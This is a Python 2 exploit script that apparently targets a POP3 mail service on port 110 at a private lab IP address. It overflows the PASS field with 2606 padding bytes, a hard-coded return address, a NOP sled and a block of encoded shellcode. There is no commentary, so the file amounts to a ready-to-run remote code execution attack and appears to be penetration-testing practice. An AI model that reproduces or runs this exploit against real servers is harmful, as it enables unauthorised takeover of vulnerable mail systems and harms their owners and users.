#!/usr/bin/python2
import socket

# Settings
HOST = '192.168.50.2'
PORT = '110'

shellcode = "\x90" * 10
shellcode += "\xbf\x72\x84\x7c\xb1\xda\xd9\xd9\x74\x24\xf4"
shellcode += "\x5e\x29\xc9\xb1\x52\x31\x7e\x12\x83\xc6\x04"
shellcode += "\x03\x0c\x8a\x9e\x44\x0c\x7a\xdc\xa7\xec\x7b"
shellcode += "\x81\x2e\x09\x4a\x81\x55\x5a\xfd\x31\x1d\x0e"
shellcode += "\xf2\xba\x73\xba\x81\xcf\x5b\xcd\x22\x65\xba"
shellcode += "\xe0\xb3\xd6\xfe\x63\x30\x25\xd3\x43\x09\xe6"
shellcode += "\x26\x82\x4e\x1b\xca\xd6\x07\x57\x79\xc6\x2c"
shellcode += "\x2d\x42\x6d\x7e\xa3\xc2\x92\x37\xc2\xe3\x05"
shellcode += "\x43\x9d\x23\xa4\x80\x95\x6d\xbe\xc5\x90\x24"
shellcode += "\x35\x3d\x6e\xb7\x9f\x0f\x8f\x14\xde\xbf\x62"
shellcode += "\x64\x27\x07\x9d\x13\x51\x7b\x20\x24\xa6\x01"
shellcode += "\xfe\xa1\x3c\xa1\x75\x11\x98\x53\x59\xc4\x6b"
shellcode += "\x5f\x16\x82\x33\x7c\xa9\x47\x48\x78\x22\x66"
shellcode += "\x9e\x08\x70\x4d\x3a\x50\x22\xec\x1b\x3c\x85"
shellcode += "\x11\x7b\x9f\x7a\xb4\xf0\x32\x6e\xc5\x5b\x5b"
shellcode += "\x43\xe4\x63\x9b\xcb\x7f\x10\xa9\x54\xd4\xbe"
shellcode += "\x81\x1d\xf2\x39\xe5\x37\x42\xd5\x18\xb8\xb3"
shellcode += "\xfc\xde\xec\xe3\x96\xf7\x8c\x6f\x66\xf7\x58"
shellcode += "\x3f\x36\x57\x33\x80\xe6\x17\xe3\x68\xec\x97"
shellcode += "\xdc\x89\x0f\x72\x75\x23\xea\x15\xba\x1c\xc6"
shellcode += "\xe4\x52\x5f\x26\xf6\xfe\xd6\xc0\x92\xee\xbe"
shellcode += "\x5b\x0b\x96\x9a\x17\xaa\x57\x31\x52\xec\xdc"
shellcode += "\xb6\xa3\xa3\x14\xb2\xb7\x54\xd5\x89\xe5\xf3"
shellcode += "\xea\x27\x81\x98\x79\xac\x51\xd6\x61\x7b\x06"
shellcode += "\xbf\x54\x72\xc2\x2d\xce\x2c\xf0\xaf\x96\x17"
shellcode += "\xb0\x6b\x6b\x99\x39\xf9\xd7\xbd\x29\xc7\xd8"
shellcode += "\xf9\x1d\x97\x8e\x57\xcb\x51\x79\x16\xa5\x0b"
shellcode += "\xd6\xf0\x21\xcd\x14\xc3\x37\xd2\x70\xb5\xd7"
shellcode += "\x63\x2d\x80\xe8\x4c\xb9\x04\x91\xb0\x59\xea"
shellcode += "\x48\x71\x79\x09\x58\x8c\x12\x94\x09\x2d\x7f"
shellcode += "\x27\xe4\x72\x86\xa4\x0c\x0b\x7d\xb4\x65\x0e"
shellcode += "\x39\x72\x96\x62\x52\x17\x98\xd1\x53\x32"

buffer = 'A' * 2606 + '\xe1\xbc\x08\x76' + shellcode

print("Payload with %s bytes" % len(buffer))
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((str(HOST), int(PORT)))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + "\r\n")
s.send('QUIT\r\n')
s.close()

